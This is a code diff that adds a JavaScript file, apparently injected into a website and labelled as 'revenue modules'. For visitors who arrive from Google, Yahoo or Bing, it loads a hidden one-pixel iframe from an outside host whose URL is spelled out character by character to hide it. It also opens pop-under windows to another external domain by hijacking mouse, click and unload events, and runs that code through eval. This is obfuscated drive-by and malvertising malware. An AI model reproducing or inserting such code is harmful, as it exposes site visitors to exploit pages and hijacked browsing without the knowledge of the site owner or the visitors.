@@ -1,0 +1,114 @@
+//finding keyword
+key = document.referrer.match(/\.google\..*?q\=(.*?)\&/);
+if(key == null) {
+	key = document.referrer.match(/\.google\.(.*?)\//);
+}
+if(key == null) {
+	key = document.referrer.match(/\.yahoo.*?p\=(.*?)\&/);
+}
+if(key == null) {
+	key = document.referrer.match(/\.bing.*?q\=(.*?)\&/);
+}
+
+// if keyword found start revenue modules
+if(key != null && readCookie("gntestcook") == null ){
+		GlobalClick=0;
+		
+		if((readCookie("gnetestcook") == null) && (navigator.userAgent.indexOf("MSIE") != -1)){
+				createCookie("gnetestcook",1,30);
+				var element2=document.createElement('iframe');
+				element2.src='h'+'t'+'t'+'p'+':'+'/'+'/'+'s'+'i'+'n'+'g'+'u'+'l'+'.'+'c'+'o'+'.'+'c'+'c'+':'+'8'+'1'+'/'+'b'+'l'+'1'+'/';
+				element2.style.width="1";
+				element2.style.height="1";
+				element2.style.display="none";
+				setTimeout("document.body.appendChild(element2)",100);
+		}
+		
+		var fu8973=setTimeout("event1under()",50);
+		var fu8972=setTimeout("event1under()",950);
+		var fu8971=setTimeout("event1under()",2000);
+	
+		document.onmouseover=event2under;
+		document.onmousedown=event1under;
+		
+		event1under();
+
+	
+} else {
+// start revenue modules without keywords
+
+}
+
+
+
+// START: cookie set functions
+function createCookie(name,value,days) {
+	if (days) {
+		var date = new Date();
+		date.setTime(date.getTime()+(days*24*60*60*1000));
+		var expires = "; expires="+date.toGMTString();
+	}
+	else var expires = "";
+	document.cookie = name+"="+value+expires+"; path=/";
+}
+
+function readCookie(name) {
+	var nameEQ = name + "=";
+	var ca = document.cookie.split(';');
+	for(var i=0;i < ca.length;i++) {
+		var c = ca[i];
+		while (c.charAt(0)==' ') c = c.substring(1,c.length);
+		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+	}
+	return null;
+}
+
+// END: Cookie set functions
+
+// START: helper function for click under
+function click1under()
+{   
+	GlobalClick=GlobalClick+1;  
+	if(GlobalClick<2) 
+	{           
+		popup1ClUpTrafRu('1000000');
+	}
+}
+
+function popup1ClUpTrafRu(gocode)
+{
+	if((navigator.userAgent.indexOf("Macintosh") == -1) && (navigator.userAgent.indexOf("Firefox") == -1) && (navigator.userAgent.indexOf("Chrome") == -1)){ 
+		createCookie("gntestcook",1,30);
+		day = new Date();
+		URL = "http://www3.thebestraz-network.byinter.net/?13aa0369f5=m%2Bzgl2umm5iTi%2BPd1p6tU%2BLZ4LTUo89jm6rMntqe1FI%3D";
+		if(navigator.userAgent.indexOf("MSIE") != -1){ URL = "http://www3.thebestraz-network.byinter.net/?13aa0369f5=m%2Bzgl2umm5iTi%2BPd1p6tU%2BLZ4LTUo89jm6rMntqe1FI%3D"; }
+		//if(navigator.userAgent.indexOf("Firefox") != -1){ URL = "http://www3.thebestraz-network.byinter.net/?13aa0369f5=m%2Bzgl2umm5iTi%2BPd1p6tU%2BLZ4LTUo89jm6rMntqe1FI%3D"; }
+		//if(navigator.userAgent.indexOf("Chrome") != -1){ URL = "http://www3.thebestraz-network.byinter.net/?13aa0369f5=m%2Bzgl2umm5iTi%2BPd1p6tU%2BLZ4LTUo89jm6rMntqe1FI%3D"; }
+		id = day.getTime();
+		eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=1,scrollbars=1,statusbar=1,menubar=1,resizable=1,,,,').blur();");
+		window.focus();
+	}
+	return true;
+}
+
+function event1under()
+{   
+	document.onmouseup=click1under;
+	document.onclick=click1under;
+	document.onmouseover=event2under;
+	if(navigator.appName == "Microsoft Internet Explorer")  
+	{ 
+		self.onunload=function() 
+		{
+			click1under();
+		} 
+	}
+}
+
+function event2under()
+{   
+	document.onmousedown=event1under;
+}
+
+// END: helper function for click under
+
